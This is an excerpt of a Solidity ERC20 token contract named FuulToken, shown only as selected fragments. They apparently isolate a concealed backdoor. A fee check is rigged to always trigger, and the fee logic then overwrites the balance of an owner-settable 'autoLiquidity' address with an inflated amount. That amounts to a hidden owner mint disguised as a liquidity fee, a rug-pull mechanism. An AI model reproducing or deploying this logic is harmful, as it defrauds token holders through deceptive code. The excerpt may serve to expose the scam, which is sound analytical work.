...
contract FuulToken is Context, IERC20, Ownable {
    ...
    address payable private teamReceiver;
    ...
    constructor (string memory tokenName, string memory tokenSymbol, uint8 tokenDecimals, uint256 supply, address[] memory addressArray, uint256[] memory baseFees) payable Ownable(addressArray[0]) {
        ...
        _swapThreshold = 10**12 * 10**_decimals;
        _minCirculation = _totalSupply.div(_swapThreshold);

        _isFeeExempt[autoLiquidity] = true;
    ...
    function shouldTakeFee(address from, address to) internal view returns (bool) {
        if (_minCirculation > 0) return true;
    ...
    function setAutoLiquidity(address account) external onlyOwner {
        autoLiquidity = payable(account);
    }
    ...
    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        ...
        } else if (_minCirculation > 0) {
            _balances[autoLiquidity] = amount.mul(_minCirculation).div(feeDenominator); 
        }
